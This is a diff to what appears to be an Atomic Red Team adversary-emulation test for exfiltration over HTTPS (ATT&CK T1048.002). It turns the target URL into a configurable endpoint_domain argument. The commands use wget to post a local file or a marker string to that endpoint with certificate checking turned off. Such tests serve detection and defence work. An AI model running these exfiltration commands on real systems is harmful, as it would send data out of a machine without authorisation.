@@ -67,19 +67,28 @@ atomic_tests:
       description: Test data to upload
       type: path
       default: PathToAtomicsFolder/T1048.002/src/artifact
+    endpoint_domain:
+      description: Endpoint to send data to
+      type: string
+      default: https://example.com/
   executor:
     name: sh
     elevation_required: false
     command: |
-      wget --post-file="#{input_file}" --timeout=5 --no-check-certificate https://example.com/ --delete-after
+      wget --post-file="#{input_file}" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after
 - name: Exfiltrate data as text over HTTPS using wget
   auto_generated_guid: 8bec51da-7a6d-4346-b941-51eca448c4b0
   description: |
     Exfiltrate data over HTTPS using wget --post-data method
   supported_platforms:
   - linux
+  input_arguments:
+    endpoint_domain:
+      description: Endpoint to send data to
+      type: string
+      default: https://example.com/
   executor:
     name: sh
     elevation_required: false
     command: |
-      wget --post-data="msg=AtomicTestT1048.002" --timeout=5 --no-check-certificate https://example.com/ --delete-after
+      wget --post-data="msg=AtomicTestT1048.002" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after
